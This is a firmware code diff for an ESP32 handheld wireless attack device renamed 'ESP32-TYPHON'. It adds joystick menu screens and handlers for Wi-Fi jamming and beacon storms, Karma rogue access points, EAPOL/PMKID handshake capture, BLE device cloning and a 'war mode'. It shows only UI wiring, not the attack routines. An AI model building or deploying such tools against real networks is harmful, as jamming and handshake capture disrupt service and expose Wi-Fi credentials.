-    int cnt = bleScanning ? 0 : bleCount;
-    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; if (_top > _sel) _top = _sel; }
+    int cnt = bleCount;
+    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; menuEnsureVisible(_sel, _top, cnt, 6); }
     if (a == JOY_UP || a == JOY_HOLD_UP) {
-      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+      if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
     } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
-      if (cnt > 0 && _sel < cnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
+      if (cnt > 0 && _sel < cnt - 1) { _sel++; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
     } else if (a == JOY_SELECT) {
       if (!bleScanning) { bleScanStart(); _sel = 0; _top = 0; _dirty = true; }
-    } else if (a == JOY_BACK) goBack();
+    } else if (a == JOY_BACK || a == JOY_BACK2) goBack();
     return;
   }
 
@@ -3777,7 +3954,7 @@ void UI::handleInput(JoyAction a) {
     if (a == JOY_UP || a == JOY_HOLD_UP) {
       if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
     } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
-      if (_sel < menuCnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
+      if (_sel < menuCnt-1) { _sel++; menuEnsureVisible(_sel, _top, menuCnt, 5); _dirty = true; }
     } else if (a == JOY_SELECT) {
       if (_sel == 0) deauthStartAll();
       else deauthStart(_sel - 1);
@@ -3852,21 +4029,114 @@ void UI::handleInput(JoyAction a) {
     return;
   }
 
-  // BLE Sniffer / Spoofer
+  // BLE Sniffer / Spoofer — list + mode + device pick
   if (_screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF) {
-    if (a == JOY_BACK) goBack();
-    else if (a == JOY_SELECT) {
-      if (_screen == SCR_BLE_SNIFF) {
-        sniffStop(); sniffStart(); _dirty = true;
-      } else if (_screen == SCR_BLE_SPOOF) {
-        if (spoofRunning) spoofStop();
-        else if (spoofMode == 4 && bleCount == 0) { /* need BLE scan */ }
-        else spoofStart();
+    if (a == JOY_BACK) { goBack(); return; }
+    if (_screen == SCR_BLE_SNIFF) {
+      if (a == JOY_SELECT) { sniffStop(); sniffStart(); _dirty = true; }
+      else if (bleCount > 0 && (a == JOY_UP || a == JOY_HOLD_UP)) {
+        if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+      } else if (bleCount > 0 && (a == JOY_DOWN || a == JOY_HOLD_DOWN)) {
+        if (_sel < bleCount - 1) { _sel++; if (_sel >= _top + 5) _top = _sel - 4; _dirty = true; }
+      }
+      return;
+    }
+    // SCR_BLE_SPOOF
+    if (spoofRunning) {
+      if (a == JOY_SELECT || a == JOY_BACK) { spoofStop(); _dirty = true; }
+      return;
+    }
+    if (a == JOY_LEFT || a == JOY_HOLD_LEFT || a == JOY_RIGHT || a == JOY_HOLD_RIGHT) {
+      spoofMode = (spoofMode + 1) % 6;
+      _dirty = true;
+      return;
+    }
+    // Clone mode: pick device from scan list
+    if (spoofMode == 4 && bleCount > 0) {
+      if (a == JOY_UP || a == JOY_HOLD_UP) {
+        if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+      } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
+        if (_sel < bleCount - 1) { _sel++; if (_sel >= _top + 4) _top = _sel - 3; _dirty = true; }
+      } else if (a == JOY_SELECT) {
+        spoofDevIdx = _sel;
+        spoofStart();
         _dirty = true;
       }
-    } else if (_screen == SCR_BLE_SPOOF && !spoofRunning &&
-               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
-      spoofMode = (spoofMode + 1) % 6;
+      return;
+    }
+    if (a == JOY_SELECT) {
+      if (spoofMode == 4 && bleCount == 0) { /* scan first */ }
+      else { spoofDevIdx = -1; spoofStart(); }
+      _dirty = true;
+    }
+    return;
+  }
+
+
+  // Karma
+  if (_screen == SCR_KARMA) {
+    if (a == JOY_BACK) { if (karmaRunning) karmaStop(); goBack(); return; }
+    if (a == JOY_SELECT) {
+      if (karmaRunning) karmaStop();
+      else karmaStart(karmaCh >= 1 && karmaCh <= 13 ? karmaCh : 1);
+      _dirty = true;
+    } else if (a == JOY_LEFT || a == JOY_HOLD_LEFT || a == JOY_RIGHT || a == JOY_HOLD_RIGHT) {
+      if (a == JOY_RIGHT || a == JOY_HOLD_RIGHT)
+        karmaCh = (karmaCh == 1 ? 6 : (karmaCh == 6 ? 11 : 1));
+      else
+        karmaCh = (karmaCh == 11 ? 6 : (karmaCh == 6 ? 1 : 11));
+      if (karmaRunning) { karmaStop(); karmaStart(karmaCh); }
+      _dirty = true;
+    }
+    return;
+  }
+
+  // Wi-Fi jam / airtime — index 0 = FULL BAND (Negator), 1..N = AP
+  if (_screen == SCR_FLOOD) {
+    if (floodRunning) {
+      if (a == JOY_BACK || a == JOY_SELECT) { floodStop(); _dirty = true; }
+      return;
+    }
+    if (a == JOY_BACK) { goBack(); return; }
+    int menuCnt = wifiCount + 1; // + FULL BAND
+    if (menuCnt < 1) menuCnt = 1;
+    if (a == JOY_UP || a == JOY_HOLD_UP) {
+      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
+      if (_sel < menuCnt - 1) { _sel++; if (_sel >= _top + 6) _top = _sel - 5; _dirty = true; }
+    } else if (a == JOY_LEFT || a == JOY_RIGHT) {
+      if (_sel > 0) floodMode = (floodMode + 1) % 3; // RTS/CTS/AUTH for AP mode
+      _dirty = true;
+    } else if (a == JOY_SELECT) {
+      if (_sel == 0) floodStart(-1, 3); // full-band beacon storm
+      else floodStart(_sel - 1, floodMode % 3);
+      _dirty = true;
+    }
+    return;
+  }
+
+  // EAPOL capture – channel select
+  if (_screen == SCR_EAPOL) {
+    if (a == JOY_BACK) { if (eapolRunning) eapolStop(); goBack(); return; }
+    if (a == JOY_LEFT || a == JOY_HOLD_LEFT) {
+      if (eapolCh > 1) eapolCh--;
+      _dirty = true;
+    } else if (a == JOY_RIGHT || a == JOY_HOLD_RIGHT) {
+      if (eapolCh < 13) eapolCh++;
+      _dirty = true;
+    } else if (a == JOY_SELECT) {
+      if (eapolRunning) eapolStop();
+      else eapolStart(eapolCh);
+      _dirty = true;
+    }
+    return;
+  }
+
+  // War mode toggle
+  if (_screen == SCR_WAR) {
+    if (a == JOY_BACK) { goBack(); return; }
+    if (a == JOY_SELECT) {
+      setWarMode(!warMode);
       _dirty = true;
     }
     return;
@@ -3882,7 +4152,7 @@ void UI::handleInput(JoyAction a) {
     if (a == JOY_UP || a == JOY_HOLD_UP) {
       if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
     } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
-      if (_sel < sourMenuCount-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
+      if (_sel < sourMenuCount-1) { _sel++; menuEnsureVisible(_sel, _top, sourMenuCount, 5); _dirty = true; }
     } else if (a == JOY_SELECT) {
       sourSelected = (_sel == 0) ? -1 : (_sel - 1);  // -1 = random mix
       sourBeginAdvertise();
@@ -3935,14 +4205,15 @@ void UI::handleInput(JoyAction a) {
   }
 
   if (a == JOY_UP || a == JOY_HOLD_UP) {
-    if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+    if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, count, Theme::MENU_ROWS); _dirty = true; }
   } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
-    if (_sel < count-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
+    if (_sel < count-1) { _sel++; menuEnsureVisible(_sel, _top, count, Theme::MENU_ROWS); _dirty = true; }
   } else if (a == JOY_SELECT) {
     if (_screen == SCR_MAIN) {
       if (_sel == 0) enterScreen(SCR_WIFI_MENU);
       else if (_sel == 1) enterScreen(SCR_BLE_MENU);
-      else if (_sel == 2) enterScreen(SCR_ABOUT);
+      else if (_sel == 2) { stopAllTools(); _dirty = true; }
+      else if (_sel == 3) enterScreen(SCR_ABOUT);
     } else if (_screen == SCR_WIFI_MENU) {
       if (_sel == 0) enterScreen(SCR_WIFI_SCAN);
       else if (_sel == 1) enterScreen(SCR_PACKET_MON);
@@ -3951,8 +4222,12 @@ void UI::handleInput(JoyAction a) {
       else if (_sel == 4) enterScreen(SCR_CLIENT_SNIFF);
       else if (_sel == 5) enterScreen(SCR_DEAUTH_DET);
       else if (_sel == 6) enterScreen(SCR_PROBE);
-      else if (_sel == 7) enterScreen(SCR_CAPTIVE);
-      else if (_sel == 8) goBack();
+      else if (_sel == 7) enterScreen(SCR_KARMA);
+      else if (_sel == 8) enterScreen(SCR_FLOOD);
+      else if (_sel == 9) enterScreen(SCR_EAPOL);
+      else if (_sel == 10) enterScreen(SCR_CAPTIVE);
+      else if (_sel == 11) enterScreen(SCR_WAR);
+      else if (_sel == 12) goBack();
     } else if (_screen == SCR_BLE_MENU) {
       if (_sel == 0) enterScreen(SCR_BLE_SCAN);
       else if (_sel == 1) enterScreen(SCR_BLE_SNIFF);
@@ -3962,7 +4237,7 @@ void UI::handleInput(JoyAction a) {
       else if (_sel == 5) enterScreen(SCR_AIRTAG);
       else if (_sel == 6) goBack();
     } else if (_screen == SCR_ABOUT) goBack();
-  } else if (a == JOY_BACK) goBack();
+  } else if (a == JOY_BACK || a == JOY_BACK2) goBack();
 }
 
 static void drawStubScreen(const char* title, const char* line1, const char* line2 = nullptr) {
@@ -3973,11 +4248,37 @@ static void drawStubScreen(const char* title, const char* line1, const char* lin
 }
 
 void UI::drawWifiScanScreen() {
-  Theme::drawStatusBar("Wi-Fi Scan");
+  int hp = joystick.isButtonDown() ? (int)joystick.holdProgress2() : -1;
+  Theme::drawStatusBar("Wi-Fi Scan", hp);
+  if (wifiScanDetail && _sel >= 0 && _sel < wifiCount) {
+    const WifiNet& n = wifiNets[_sel];
+    char line[28];
+    Theme::printCentered(n.ssid.c_str(), 22, COL_TITLE, 1);
+    snprintf(line, sizeof(line), "CH %d  %d dBm", n.ch, n.rssi);
+    Theme::printCentered(line, 38, COL_FG, 1);
+    snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X",
+             n.bssid[0], n.bssid[1], n.bssid[2], n.bssid[3], n.bssid[4], n.bssid[5]);
+    Theme::printCentered(line, 54, COL_ACCENT, 1);
+    const char* enc = "Open";
+    switch (n.enc) {
+      case WIFI_AUTH_WEP: enc = "WEP"; break;
+      case WIFI_AUTH_WPA_PSK: enc = "WPA"; break;
+      case WIFI_AUTH_WPA2_PSK: enc = "WPA2"; break;
+      case WIFI_AUTH_WPA_WPA2_PSK: enc = "WPA/WPA2"; break;
+      case WIFI_AUTH_WPA2_ENTERPRISE: enc = "Enterprise"; break;
+      case WIFI_AUTH_WPA3_PSK: enc = "WPA3"; break;
+      case WIFI_AUTH_WPA2_WPA3_PSK: enc = "WPA2/WPA3"; break;
+      default: if (n.enc != WIFI_AUTH_OPEN) enc = "Secured"; break;
+    }
+    Theme::printCentered(enc, 70, COL_FG, 1);
+    if (n.hidden) Theme::printCentered("(hidden)", 86, COL_DIM, 1);
+    Theme::drawFooter("Hold=Back", "1s");
+    return;
+  }
   if (wifiScanning) {
     Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
     Theme::printCentered("Please wait", 66, COL_DIM, 1);
-    Theme::drawFooter(nullptr, "L-Back");
+    Theme::drawFooter("Hold 2s", "Back");
     return;
   }
   static const char* ssids[WIFI_MAX_NETS];
@@ -3989,15 +4290,16 @@ void UI::drawWifiScanScreen() {
   Theme::drawWifiList(ssids, rssis, wifiCount, _sel, _top);
   char left[20];
   snprintf(left, sizeof(left), "%d nets", wifiCount);
-  Theme::drawFooter(left, "Sel=Refresh");
+  Theme::drawFooter(left, "Sel=Info Hold=Scan");
 }
 
 void UI::drawBleScanScreen() {
-  Theme::drawStatusBar("BLE Scan");
+  int hp = joystick.isButtonDown() ? (int)joystick.holdProgress() : -1;
+  Theme::drawStatusBar("BLE Scan", hp);
   if (bleScanning) {
     Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
-    Theme::printCentered("4 seconds", 66, COL_DIM, 1);
-    Theme::drawFooter(nullptr, "L-Back");
+    Theme::printCentered("~12 seconds", 66, COL_DIM, 1);
+    Theme::drawFooter(nullptr, "Hold=Back");
     return;
   }
   static const char* names[BLE_MAX_DEVS];
@@ -4006,10 +4308,10 @@ void UI::drawBleScanScreen() {
     names[i] = bleDevs[i].name.c_str();
     rssis[i] = bleDevs[i].rssi;
   }
-  Theme::drawWifiList(names, rssis, bleCount, 0, 0);  // no interactive sel for continuous sniff
+  Theme::drawWifiList(names, rssis, bleCount, _sel, _top);
   char left[20];
   snprintf(left, sizeof(left), "%d devs", bleCount);
-  Theme::drawFooter(left, "Sel=Refresh");
+  Theme::drawFooter(left, "Sel=Rescan");
 }
 
 static void drawPacketMonitor() {
@@ -4183,11 +4485,16 @@ static void drawCaptiveScreen() {
 }
 
 
-static void drawBleSniffScreen() {
+static void drawBleSniffScreen(int sel, int top) {
   Theme::drawStatusBar("BLE Sniffer");
   if (bleScanning && bleCount == 0) {
     Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
     Theme::drawFooter(nullptr, "L-Back");
+    return;
+  }
+  if (bleCount <= 0) {
+    Theme::printCentered("No devices", 50, COL_WARN, 1);
+    Theme::drawFooter("Sel=Scan", "L-Back");
     return;
   }
   static const char* names[BLE_MAX_DEVS];
@@ -4196,35 +4503,124 @@ static void drawBleSniffScreen() {
     names[i] = bleDevs[i].name.c_str();
     rssis[i] = bleDevs[i].rssi;
   }
-  Theme::drawWifiList(names, rssis, bleCount, 0, 0);  // no interactive sel for continuous sniff
+  Theme::drawWifiList(names, rssis, bleCount, sel, top);
   char left[20];
   snprintf(left, sizeof(left), "%d devs", bleCount);
   Theme::drawFooter(left, "Sel=Refresh");
 }
 
-static void drawBleSpoofScreen() {
+static void drawBleSpoofScreen(int sel, int top) {
   Theme::drawStatusBar("BLE Spoofer");
+  const char* mn = "APPLE";
+  if (spoofMode == 1) mn = "SAMSUNG";
+  else if (spoofMode == 2) mn = "GOOGLE";
+  else if (spoofMode == 3) mn = "NAMES";
+  else if (spoofMode == 4) mn = "CLONE DEV";
+  else if (spoofMode == 5) mn = "CUSTOM";
+
   if (spoofRunning) {
-    Theme::printCentered("ADVERTISING", 36, COL_OK, 1);
-    {
-      const char* mn = "APPLE";
-      if (spoofMode == 1) mn = "SAMSUNG";
-      else if (spoofMode == 2) mn = "GOOGLE";
-      else if (spoofMode == 3) mn = "NAMES";
-      else if (spoofMode == 4) mn = "CLONE";
-      else if (spoofMode == 5) mn = "CUSTOM";
-      Theme::printCentered(mn, 52, COL_FG, 1);
-    }
-    Theme::printCentered("rotating...", 68, COL_DIM, 1);
-  } else {
-    Theme::printCentered("Mode cycle: press SEL", 40, COL_TITLE, 1);
-    if (spoofMode == 4 && bleCount == 0)
-      Theme::printCentered("BLE Scan first!", 58, COL_WARN, 1);
+    Theme::printCentered("ADVERTISING", 28, COL_OK, 1);
+    Theme::printCentered(mn, 44, COL_FG, 1);
+    if (spoofMode == 4 && spoofDevIdx >= 0 && spoofDevIdx < bleCount)
+      Theme::printCentered(bleDevs[spoofDevIdx].name.c_str(), 60, COL_ACCENT, 1);
     else
-      Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
+      Theme::printCentered("active", 60, COL_DIM, 1);
+    Theme::drawFooter("Sel=Stop", "L-Back");
+    return;
   }
+
+  Theme::printCentered(mn, 20, COL_TITLE, 1);
+  if (spoofMode == 4) {
+    if (bleCount <= 0) {
+      Theme::printCentered("Scan BLE first", 50, COL_WARN, 1);
+      Theme::drawFooter("L/R=Mode", "L-Back");
+      return;
+    }
+    static const char* names[BLE_MAX_DEVS];
+    for (int i = 0; i < bleCount; i++) names[i] = bleDevs[i].name.c_str();
+    Theme::drawMenuList(names, bleCount, sel, top, 32, 12);
+    Theme::drawFooter("Pick dev", "Sel=Adv");
+  } else {
+    Theme::printCentered("L/R = mode", 48, COL_DIM, 1);
+    Theme::printCentered("Sel = start", 64, COL_DIM, 1);
+    Theme::drawFooter(nullptr, "L-Back");
+  }
+}
+
+static void drawKarmaScreen() {
+  Theme::drawStatusBar("Karma");
+  if (karmaRunning) {
+    Theme::printCentered("RUNNING", 36, COL_OK, 1);
+    char buf[28];
+    snprintf(buf, sizeof(buf), "CH%d SSIDs:%d", karmaCh, karmaCount);
+    Theme::printCentered(buf, 52, COL_FG, 1);
+    snprintf(buf, sizeof(buf), "TX %lu", (unsigned long)karmaSent);
+    Theme::printCentered(buf, 68, COL_DIM, 1);
+    Theme::drawFooter("Sel=Stop", "L-Back");
+  } else {
+    Theme::printCentered("Probe->beacon", 40, COL_TITLE, 1);
+    char buf[20];
+    snprintf(buf, sizeof(buf), "CH %u", (unsigned)karmaCh);
+    Theme::printCentered(buf, 56, COL_FG, 1);
+    Theme::drawFooter("L/R=CH Sel=Go", "L-Back");
+  }
+}
+
+static void drawFloodScreen(int sel, int top) {
+  Theme::drawStatusBar("WiFi Jammer");
+  if (floodRunning) {
+    Theme::printCentered("JAMMING", 32, COL_WARN, 1);
+    if (floodMode == 3 || floodTarget < 0)
+      Theme::printCentered("FULL 2.4G", 48, COL_FG, 1);
+    else {
+      const char* m = (floodMode==0)?"RTS+BCN":(floodMode==1)?"CTS":"AUTH+BCN";
+      Theme::printCentered(m, 48, COL_FG, 1);
+    }
+    char buf[24];
+    snprintf(buf, sizeof(buf), "%lu tx", (unsigned long)floodSent);
+    Theme::printCentered(buf, 64, COL_DIM, 1);
+    Theme::drawFooter("Sel=Stop", "L-Back");
+  } else {
+    // Line 0 = FULL BAND always available without scan
+    static const char* items[97];
+    static char labels[96][18];
+    items[0] = "* FULL BAND *";
+    int n = 1;
+    for (int i = 0; i < wifiCount && n < 97; i++) {
+      strncpy(labels[i], wifiNets[i].ssid.c_str(), 17);
+      labels[i][17] = 0;
+      items[n++] = labels[i];
+    }
+    Theme::drawMenuList(items, n, sel, top, 18, 12);
+    Theme::drawFooter(sel==0?"Storm":"AP jam", "Sel=Start");
+  }
+}
+
+static void drawEapolScreen() {
+  Theme::drawStatusBar("EAPOL Capture");
+  if (eapolRunning) {
+    Theme::printCentered("LISTENING", 36, COL_OK, 1);
+    char buf[28];
+    snprintf(buf, sizeof(buf), "CH%u hits:%d", (unsigned)eapolCh, (int)eapolCount);
+    Theme::printCentered(buf, 56, COL_FG, 1);
+    Theme::drawFooter("Sel=Stop", "L-Back");
+  } else {
+    Theme::printCentered("Handshake/PMKID", 36, COL_TITLE, 1);
+    char buf[20];
+    snprintf(buf, sizeof(buf), "Channel %u", (unsigned)eapolCh);
+    Theme::printCentered(buf, 56, COL_FG, 1);
+    Theme::drawFooter("L/R=CH Sel=Go", "L-Back");
+  }
+}
+
+static void drawWarScreen() {
+  Theme::drawStatusBar("War Mode");
+  Theme::printCentered(warMode ? "WAR ON" : "WAR OFF", 40, warMode ? COL_WARN : COL_DIM, 1);
+  Theme::printCentered(warMode ? "Max RF / no SoftAP" : "Normal radio", 58, COL_FG, 1);
+  Theme::printCentered("Sel = toggle", 76, COL_DIM, 1);
   Theme::drawFooter(nullptr, "L-Back");
 }
+
 
 static void drawSourAppleList(int sel, int top) {
   Theme::drawStatusBar("Sour Apple");
@@ -4246,7 +4642,7 @@ static void drawSourAppleList(int sel, int top) {
 }
 
 static void drawJamScreen() {
-  Theme::drawStatusBar("BLE ADV Flood");
+  Theme::drawStatusBar("BLE Jammer");
   if (jamRunning) {
     Theme::printCentered("FLOODING", 40, COL_ERR, 1);
     char buf[24];
@@ -4299,23 +4695,23 @@ static void drawAirTagScreen() {
 
 
 void UI::drawCurrent() {
-
   Theme::clear();
+  int hp = joystick.isButtonDown() ? (int)joystick.holdProgress() : -1;
   switch (_screen) {
     case SCR_MAIN:
-      Theme::drawStatusBar("ESP32-DIV", false);
+      Theme::drawStatusBar("ESP32-TYPHON", hp);
       Theme::drawMenuList(MAIN_ITEMS, MAIN_COUNT, _sel, _top);
-      Theme::drawFooter("Joy: Nav", "Btn: Select");
+      Theme::drawFooter("Joy: Nav", "Hold=Back");
       break;
     case SCR_WIFI_MENU:
-      Theme::drawStatusBar("Wi-Fi Tools");
+      Theme::drawStatusBar("Wi-Fi Tools", hp);
       Theme::drawMenuList(WIFI_ITEMS, WIFI_COUNT, _sel, _top);
-      Theme::drawFooter("Up/Dn", "Sel / L-Back");
+      Theme::drawFooter("Up/Dn", "Hold=Back");
       break;
     case SCR_BLE_MENU:
-      Theme::drawStatusBar("Bluetooth");
+      Theme::drawStatusBar("Bluetooth", hp);
       Theme::drawMenuList(BLE_ITEMS, BLE_COUNT, _sel, _top);
-      Theme::drawFooter("Up/Dn", "Sel / L-Back");
+      Theme::drawFooter("Up/Dn", "Hold=Back");
       break;
     case SCR_WIFI_SCAN:   drawWifiScanScreen(); break;
     case SCR_BLE_SCAN:    drawBleScanScreen(); break;
@@ -4326,14 +4722,18 @@ void UI::drawCurrent() {
     case SCR_CLIENT_SNIFF: drawClientSniffScreen(_sel, _top); break;
     case SCR_PROBE:       drawProbeScreen(_sel, _top); break;
     case SCR_CAPTIVE:     drawCaptiveScreen(); break;
-    case SCR_BLE_SNIFF:   drawBleSniffScreen(); break;
-    case SCR_BLE_SPOOF:   drawBleSpoofScreen(); break;
+    case SCR_BLE_SNIFF:   drawBleSniffScreen(_sel, _top); break;
+    case SCR_BLE_SPOOF:   drawBleSpoofScreen(_sel, _top); break;
+    case SCR_KARMA:      drawKarmaScreen(); break;
+    case SCR_FLOOD:      drawFloodScreen(_sel, _top); break;
+    case SCR_EAPOL:      drawEapolScreen(); break;
+    case SCR_WAR:        drawWarScreen(); break;
     case SCR_SOUR_APPLE:  drawSourAppleList(_sel, _top); break;
     case SCR_BLE_JAM:     drawJamScreen(); break;
     case SCR_AIRTAG:      drawAirTagScreen(); break;
     case SCR_ABOUT:
-      Theme::drawStatusBar("About");
-      Theme::printCentered("ESP32-DIV Port", 36, COL_TITLE, 1);
+      Theme::drawStatusBar("About", hp);
+      Theme::printCentered("ESP32-TYPHON", 36, COL_TITLE, 1);
       Theme::printCentered("ST7735 160x128", 52, COL_FG, 1);
       Theme::printCentered("WiFi + BLE", 68, COL_DIM, 1);
       Theme::printCentered("Joystick UI", 84, COL_DIM, 1);
@@ -4420,13 +4820,24 @@ void UI::loop() {
   static uint32_t lastLive = 0;
   if ((_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
        _screen == SCR_DEAUTH_DET || _screen == SCR_DEAUTH || _screen == SCR_CLIENT_SNIFF ||
-       _screen == SCR_PROBE || _screen == SCR_CAPTIVE ||
+       _screen == SCR_PROBE || _screen == SCR_KARMA || _screen == SCR_FLOOD ||
+       _screen == SCR_EAPOL || _screen == SCR_WAR || _screen == SCR_CAPTIVE ||
        _screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF ||
        _screen == SCR_SOUR_APPLE || _screen == SCR_BLE_JAM ||
        _screen == SCR_AIRTAG) &&
       (millis() - lastLive > 250)) {
     lastLive = millis();
     _dirty = true;
+  }
+
+  // Hold progress counter — refresh header while button down
+  static uint8_t lastHoldPct = 255;
+  uint8_t hp = joystick.isButtonDown() ? joystick.holdProgress() : 0;
+  if (joystick.isButtonDown()) {
+    if (_screen == SCR_WIFI_SCAN) hp = joystick.holdProgress2();
+    if (hp != lastHoldPct) { lastHoldPct = hp; _dirty = true; }
+  } else {
+    if (lastHoldPct != 255) { lastHoldPct = 255; _dirty = true; }
   }
 
   JoyAction a = joystick.getAction();
